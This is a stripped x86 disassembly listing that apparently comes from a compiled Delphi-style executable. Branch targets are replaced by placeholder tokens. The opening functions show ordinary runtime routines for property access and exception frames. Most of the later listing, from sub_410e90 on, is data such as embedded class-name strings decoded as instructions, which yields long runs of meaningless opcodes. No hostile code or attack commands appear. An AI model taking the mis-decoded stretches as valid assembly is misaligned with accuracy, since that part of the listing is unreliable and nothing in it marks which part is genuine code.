cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410678
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4106d4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410728
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404148
mov ecx esp
mov edx esi
mov eax ebx
call sub_4106d4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410770
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41075c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4107b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4107f8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4046d8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410834
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107ff
lea eax [ ebp - 0x4 ]
call sub_40458c
retn
sub_410808
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410728
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410770
pop ebx
retn
dec bl
je r-xdata
call sub_4107b0
jmp r-xdata
pop ebx
retn
sub_410834
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4108fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404134
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410808
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410901
lea eax [ ebp - 0xc ]
call sub_403eac
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4045c8
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410908
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4104d8
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410950 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410a7f ]
jmp [ eax * 4 + jump_table_4109ec ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410b14
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410b00
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410b54
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410b8c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410bc8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405500
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410c3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410c82
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c89
retn
mov eax rw-data
call sub_403eac
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404928
sub_410c94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410cb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410cc0
retn
sub_410e90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx + 0xc0041 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ edi + ecx ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx ] dh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ esi ] cs
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] dl
inc ebp
inc esi
outsb
adc [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
adc [ ecx ] al
or al 0x0
add [ eax ] al
mov [ esi ] cs
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
outsd
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
add ah dh
adc [ eax ] al
lea eax [ eax ]
fmul [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmovno eax [ eax ]
or al 0x0
add [ eax ] al
call 0x204150df
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004110 ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x11 ] dl
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add al ah
xor [ eax ] al
adc [ ebp + 0x46 ] al
shl al 0xf
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cmovno eax [ eax ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004110 ] ah
inc ebp
jb r-xdata
outsb
add al ah
xor [ eax ] al
or al 0x45
push ebx
je r-xdata
add [ eax ] al
call 0x20415083
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x72434645 ] cl
popad
je r-xdata
inc eax
add [ edi + ecx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
cmovno eax [ eax ]
or al 0x0
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
xor [ eax ] al
or eax [ ebp + 0x46 ]
adc [ ecx ] al
add [ eax ] al
add [ eax ] al
dec esi
outsd
je r-xdata
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] cl
inc ebp
inc esi
clc
adc [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
adc [ ecx ] al
or al 0x0
add [ eax ] al
cld
cmovno eax [ eax ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
movsb [ edi ] [ esi ]
xor [ eax ] al
loopne r-xdata
pushad
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
or [ edx ] dl
inc ecx
add [ eax + eax ] cl
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
lodsb [ esi ]
adc [ ecx ] eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
outsd
jne r-xdata
add [ eax ] al
inc ebp
jb r-xdata
xor [ eax ] al
loopne r-xdata
push dx
jae sub_4113ee
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0x41 ] dh
outsd
jb r-xdata
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
inc ecx
add [ eax + eax ] cl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
adc al [ ecx ]
or al 0x0
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
lea eax [ eax ]
or [ edx ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
adc al [ ecx ]
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ ecx ] eax
or al 0x0
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
adc al 0x41
inc eax
add [ ecx ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
jne r-xdata
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
mov eax 0x4112
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004112 ] bh
add [ eax ] al
add [ ebp * 2 + 0x33200040 ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax ] dl
inc ebp
push ebx
je r-xdata
inc eax
add [ eax ] bl
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ebx ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
jae r-xdata
add [ eax ] al
cld
cmovno eax [ eax ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
adc [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
adc [ ecx ] eax
or al 0x0
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3b200040 ] ah
inc ecx
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
adc al 0x41
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3c940040 ] ah
inc ecx
add [ 0x74694254 ] al
jae r-xdata
inc eax
add [ ebx + esi ] dh
rol [ eax + 0x15 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x41 ] cl
add [ edx + 0x15 ] bl
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ esi + edi + 0x41 ] bl
add [ edx ] al
add bh bh
inc ecx
add [ edi + esi + 0x54050041 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x1494c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx + 0x240041 ] dl
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
add [ eax ] bh
aaa
add [ eax ] dl
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x37ffbec8 ] cl
cmp al [ ecx ]
cmp [ edi ] dh
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x1430c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14 ] al
inc ecx
arpl [ ebp + 0x73 ] sp
rcl [ ebx ] 0x1
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x6d
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add al ah
xor [ eax ] al
cmovne ecx [ edi + 0x75 ]
je r-xdata
xor [ eax ] al
dec esp
mov bl 0x40
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ ebx ] 0x1
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
adc eax [ ecx ]
or al 0x0
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ ebx + esi * 4 + 0x40 ] cl
add [ eax ] dl
add [ eax ] al
add al bh
insd
inc eax
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
inc ecx
sub_4113ee
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
adc al 0x41
add [ eax ] dl
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x37ffbec8 ] cl
cmp al [ ecx ]
cmp [ edi ] dh
inc ecx
add [ edi + esi + 0x54050041 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x1494c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx + 0x240041 ] dl
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3b200040 ] ah
inc ecx
add [ ebx ] cl
push esp
push esp
